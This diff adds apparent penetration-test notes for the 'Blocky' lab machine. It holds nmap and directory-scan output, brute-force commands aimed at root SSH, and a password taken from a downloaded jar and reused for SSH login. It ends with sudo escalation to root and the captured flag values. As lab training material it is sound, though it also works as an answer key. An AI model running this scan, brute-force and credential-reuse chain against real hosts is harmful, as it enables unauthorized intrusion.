@@ -1,0 +1,236 @@
+Machine-Name : Blocky
+IP-Address   : 10.129.39.254
+
+Command-Line: sudo nmap -A 10.129.39.254
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-11 00:36 EST
+    Nmap scan report for 10.129.39.254
+    Host is up (0.062s latency).
+    Not shown: 996 filtered ports
+    PORT     STATE  SERVICE VERSION
+    21/tcp   open   ftp?
+    22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
+    |   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
+    |_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
+    80/tcp   open   http    Apache httpd 2.4.18 ((Ubuntu))
+    |_http-generator: WordPress 4.8
+    |_http-server-header: Apache/2.4.18 (Ubuntu)
+    |_http-title: BlockyCraft &#8211; Under Construction!
+    8192/tcp closed sophos
+    Device type: general purpose|WAP|specialized|storage-misc|broadband router|printer
+    Running (JUST GUESSING): Linux 3.X|4.X|5.X|2.6.X (94%), Asus embedded (90%), Crestron 2-Series (89%), HP embedded (89%)
+    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel cpe:/h:asus:rt-ac66u cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:5.1 cpe:/o:linux:linux_kernel:2.6
+    Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 3.13 (94%), Linux 3.13 or 4.2 (94%), Linux 4.2 (94%), Linux 4.4 (94%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.12 (91%), Linux 3.2 - 4.9 (91%), Linux 3.8 - 3.11 (91%)
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt -f -t 20 -u http://10.129.39.254
+Result:
+    [01:04:51] Starting:
+    [01:04:52] 301 -    0B  - /index.php  ->  http://10.129.39.254/
+    [01:04:54] 403 -  292B  - /icons/
+    [01:04:56] 301 -  309B  - /wiki  ->  http://10.129.39.254/wiki/
+    [01:04:56] 200 -  380B  - /wiki/
+    [01:04:56] 301 -  315B  - /wp-content  ->  http://10.129.39.254/wp-content/
+    [01:04:56] 200 -    0B  - /wp-content/
+    [01:05:00] 200 -    2KB - /wp-login.php
+    [01:05:02] 301 -  312B  - /plugins  ->  http://10.129.39.254/plugins/
+    [01:05:02] 200 -  745B  - /plugins/
+    [01:05:05] 200 -   19KB - /license.txt
+    [01:05:07] 301 -  316B  - /wp-includes  ->  http://10.129.39.254/wp-includes/
+    [01:05:07] 200 -   40KB - /wp-includes/
+    [01:05:13] 301 -  315B  - /javascript  ->  http://10.129.39.254/javascript/
+    [01:05:13] 403 -  297B  - /javascript/
+    [01:06:21] 200 -  135B  - /wp-trackback.php
+    [01:07:05] 301 -  313B  - /wp-admin  ->  http://10.129.39.254/wp-admin/
+    [01:07:05] 302 -    0B  - /wp-admin/  ->  http://10.129.39.254/wp-login.php?redirect_to=http%3A%2F%2F10.129.39.254%2Fwp-admin%2F&reauth=1
+    [01:08:09] 301 -  315B  - /phpmyadmin  ->  http://10.129.39.254/phpmyadmin/
+    [01:08:09] 200 -   10KB - /phpmyadmin/
+    [01:10:01] 405 -   42B  - /xmlrpc.php
+    [01:18:39] 302 -    0B  - /wp-signup.php  ->  http://10.129.39.254/wp-login.php?action=register
+    [01:34:22] 403 -  299B  - /server-status
+    [01:34:22] 403 -  300B  - /server-status/
+
+    Task Completed
+
+
+Command-Line: sudo dirb 10.129.39.254
+Result:
+    -----------------
+    DIRB v2.22
+    By The Dark Raver
+    -----------------
+
+    START_TIME: Wed Nov 11 01:06:12 2020
+    URL_BASE: http://10.129.39.254/
+    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+    -----------------
+
+    GENERATED WORDS: 4613
+
+    ---- Scanning URL: http://10.129.39.254/ ----
+    + http://10.129.39.254/index.php (CODE:301|SIZE:0)
+    ==> DIRECTORY: http://10.129.39.254/javascript/
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/
+    ==> DIRECTORY: http://10.129.39.254/plugins/
+    + http://10.129.39.254/server-status (CODE:403|SIZE:299)
+    ==> DIRECTORY: http://10.129.39.254/wiki/
+    ==> DIRECTORY: http://10.129.39.254/wp-admin/
+    ==> DIRECTORY: http://10.129.39.254/wp-content/
+    ==> DIRECTORY: http://10.129.39.254/wp-includes/
+    + http://10.129.39.254/xmlrpc.php (CODE:405|SIZE:42)
+
+    ---- Entering directory: http://10.129.39.254/javascript/ ----
+    ==> DIRECTORY: http://10.129.39.254/javascript/jquery/
+
+    ---- Entering directory: http://10.129.39.254/phpmyadmin/ ----
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/doc/
+    + http://10.129.39.254/phpmyadmin/favicon.ico (CODE:200|SIZE:22486)
+    + http://10.129.39.254/phpmyadmin/index.php (CODE:200|SIZE:10322)
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/js/
+    + http://10.129.39.254/phpmyadmin/libraries (CODE:403|SIZE:306)
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/locale/
+    + http://10.129.39.254/phpmyadmin/phpinfo.php (CODE:200|SIZE:10324)
+    + http://10.129.39.254/phpmyadmin/setup (CODE:401|SIZE:458)
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/sql/
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/templates/
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/themes/
+
+    ---- Entering directory: http://10.129.39.254/plugins/ ----
+    ==> DIRECTORY: http://10.129.39.254/plugins/assets/
+    ==> DIRECTORY: http://10.129.39.254/plugins/files/
+    + http://10.129.39.254/plugins/index.html (CODE:200|SIZE:745)
+
+    ---- Entering directory: http://10.129.39.254/wiki/ ----
+    + http://10.129.39.254/wiki/index.php (CODE:200|SIZE:380)
+
+    ---- Entering directory: http://10.129.39.254/wp-admin/ ----
+    + http://10.129.39.254/wp-admin/admin.php (CODE:302|SIZE:0)
+    ==> DIRECTORY: http://10.129.39.254/wp-admin/css/
+    ==> DIRECTORY: http://10.129.39.254/wp-admin/images/
+    ==> DIRECTORY: http://10.129.39.254/wp-admin/includes/
+    + http://10.129.39.254/wp-admin/index.php (CODE:302|SIZE:0)
+    ==> DIRECTORY: http://10.129.39.254/wp-admin/js/
+    ==> DIRECTORY: http://10.129.39.254/wp-admin/maint/
+    ==> DIRECTORY: http://10.129.39.254/wp-admin/network/
+    ==> DIRECTORY: http://10.129.39.254/wp-admin/user/
+
+    ---- Entering directory: http://10.129.39.254/wp-content/ ----
+    + http://10.129.39.254/wp-content/index.php (CODE:200|SIZE:0)
+    ==> DIRECTORY: http://10.129.39.254/wp-content/plugins/
+    ==> DIRECTORY: http://10.129.39.254/wp-content/themes/
+    ==> DIRECTORY: http://10.129.39.254/wp-content/uploads/
+
+    ---- Entering directory: http://10.129.39.254/wp-includes/ ----
+    (!) WARNING: Directory IS LISTABLE. No need to scan it.
+        (Use mode '-w' if you want to scan it anyway)
+
+    ---- Entering directory: http://10.129.39.254/javascript/jquery/ ----
+    + http://10.129.39.254/javascript/jquery/jquery (CODE:200|SIZE:284394)
+
+    ---- Entering directory: http://10.129.39.254/phpmyadmin/doc/ ----
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/doc/html/
+
+    ---- Entering directory: http://10.129.39.254/phpmyadmin/js/ ----
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/js/jquery/
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/js/transformations/
+
+    ---- Entering directory: http://10.129.39.254/phpmyadmin/locale/ ----
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/locale/az/
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/locale/bg/
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/locale/ca/
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/locale/cs/
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/locale/da/
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/locale/de/
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/locale/el/
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/locale/es/
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/locale/et/
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/locale/fi/
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/locale/fr/
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/locale/gl/
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/locale/hu/
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/locale/ia/
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/locale/id/
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/locale/it/
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/locale/ja/
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/locale/ko/
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/locale/lt/
+    ==> DIRECTORY: http://10.129.39.254/phpmyadmin/locale/nl/
+
+
+Command-Line: reconnoitre -t 10.129.39.254 -o ~/Desktop/HTB/Machines/Blocky --service
+Result: File-Created: ~/Desktop/HTB/Machines/Blocky/10.129.39.254
+Command-Line: cd 10.129.39.254/scans
+Command-Line: cat *find*
+Result:
+    [*] Found FTP service on 10.129.39.254:21
+       [*] Enumeration
+          [=] nmap -sV -Pn -vv -p21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -oA '/home/kali/Desktop/HTB/Machines/Blocky_NF/10.129.39.254/scans/10.129.39.254_21_ftp' 10.129.39.254
+          [=] hydra -L USER_LIST -P PASS_LIST -f -o /home/kali/Desktop/HTB/Machines/Blocky_NF/10.129.39.254/scans/10.129.39.254_21_ftphydra.txt -u 10.129.39.254 -s 21 ftp
+
+    [*] Found SSH service on 10.129.39.254:22
+       [*] Bruteforcing
+          [=] medusa -u root -P /usr/share/wordlists/rockyou.txt -e ns -h 10.129.39.254 - 22 -M ssh
+          [=] hydra -f -V -t 1 -l root -P /usr/share/wordlists/rockyou.txt -s 22 10.129.39.254 ssh
+          [=] ncrack -vv -p 22 --user root -P PASS_LIST 10.129.39.254
+       [*] Use nmap to automate banner grabbing and key fingerprints, e.g.
+          [=] nmap 10.129.39.254 -p 22 -sV --script=ssh-hostkey -oA '/home/kali/Desktop/HTB/Machines/Blocky_NF/10.129.39.254/scans/10.129.39.254_22_ssh-hostkey'
+
+    [*] Found HTTP/S service on 10.129.39.254:80
+       [*] Enumeration
+          [=] nikto -h 10.129.39.254 -p 80 -output /home/kali/Desktop/HTB/Machines/Blocky_NF/10.129.39.254/scans/10.129.39.254_80_nikto.txt
+          [=] curl -i 10.129.39.254:80
+          [=] w3m -dump 10.129.39.254/robots.txt | tee /home/kali/Desktop/HTB/Machines/Blocky_NF/10.129.39.254/scans/10.129.39.254_80_robots.txt
+          [=] VHostScan -t 10.129.39.254 -oN /home/kali/Desktop/HTB/Machines/Blocky_NF/10.129.39.254/scans/10.129.39.254_80_vhosts.txt
+
+    [*] Found HTTP service on 10.129.39.254:80
+       [*] Enumeration
+          [=] dirb http://10.129.39.254:80/ -o /home/kali/Desktop/HTB/Machines/Blocky_NF/10.129.39.254/scans/10.129.39.254_80_dirb.txt
+          [=] dirbuster -H -u http://10.129.39.254:80/ -l /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 20 -s / -v -r /home/kali/Desktop/HTB/Machines/Blocky_NF/10.129.39.254/scans/10.129.39.254_80_dirbuster_medium.txt
+          [=] gobuster -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.39.254:80/ -s '200,204,301,302,307,403,500' -e | tee '/home/kali/Desktop/HTB/Machines/Blocky_NF/10.129.39.254/scans/10.129.39.254_80_gobuster_common.txt'
+          [=] gobuster -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -u http://10.129.39.254:80/ -s '200,204,301,307,403,500' -e | tee '/home/kali/Desktop/HTB/Machines/Blocky_NF/10.129.39.254/scans/10.129.39.254_80_gobuster_cgis.txt'
+
+
+
+    [*] Always remember to manually go over the portscan report and carefully read between the lines ;)
+
+
+Found Username/Author: "Notch"
+Visited-Path: /plugins
+Downloaded: BlockyCore.jar
+Found-Password: 8YsqfCTnvxAUeduzjNSXe22
+
+SSH-Attempt: ssh root@10.129.39.254
+Password: 8YsqfCTnvxAUeduzjNSXe22
+Result: !!! DENIED !!!
+
+SSH-Attempt: ssh notch@10.129.39.254
+Password: 8YsqfCTnvxAUeduzjNSXe22
+Result: *** ACCESS GRANTED ***
+
+Shell-Command: cat /home/notch/user.txt
+Result: 59fee0977fb60b8a0bc6e41e751f3cd5
+
+*** USER OWNED ***
+
+Attempting root access...
+
+Reverse-Shell: notch@Blocky:/$ sudo -l
+Result:
+    Matching Defaults entries for notch on Blocky:
+        env_reset, mail_badpass,
+        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+    User notch may run the following commands on Blocky:
+        (ALL : ALL) ALL
+
+Reverse-Shell: sudo -u root bash
+Result: *** ROOT ACCESS ***
+
+Reverse-Shell: cat root/root.txt
+Result: 0a9694a5b4d272c694679f7860f1cd5f
+
+*** ROOT OWNED ***
+
+*** FINISHED ***
